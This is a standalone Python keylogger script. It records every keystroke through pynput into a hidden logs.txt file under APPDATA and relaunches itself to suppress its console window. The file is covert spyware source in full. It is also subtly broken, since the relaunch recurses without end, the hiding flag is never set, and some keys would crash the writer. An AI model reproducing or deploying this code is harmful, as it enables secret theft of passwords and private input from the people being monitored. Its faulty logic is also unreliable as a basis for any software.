import os
import sys
import subprocess
from pynput.keyboard import Key, Listener

def on_press(key):
    with open(os.path.join(os.getenv('APPDATA'), 'logs.txt'), 'a') as f:
        if hasattr(key, 'char'):
            f.write(key.char)
        elif key == Key.space:
            f.write(' ')
        elif key == Key.enter:
            f.write('\n')
        elif key == Key.tab:
            f.write('\t')
        elif key == Key.backspace:
            f.write('[BACKSPACE]')
        elif key == Key.delete:
            f.write('[DELETE]')
        elif key == Key.shift:
            f.write('[SHIFT]')
        elif key == Key.ctrl:
            f.write('[CTRL]')
        elif key == Key.alt:
            f.write('[ALT]')
        elif key == Key.cmd:
            f.write('[CMD]')
        elif key == Key.esc:
            f.write('[ESC]')
        elif key == Key.up:
            f.write('[UP]')
        elif key == Key.down:
            f.write('[DOWN]')
        elif key == Key.left:
            f.write('[LEFT]')
        elif key == Key.right:
            f.write('[RIGHT]')
        else:
            f.write('[{}]'.format(key))

def on_release(key):
    if key == Key.esc:
        return False

def hide_console():
    if sys.platform.startswith('win'):
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        subprocess.Popen([sys.executable] + sys.argv, startupinfo=si)
    else:
        os.system("pythonw " + __file__)

def main():
    hide_console()
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
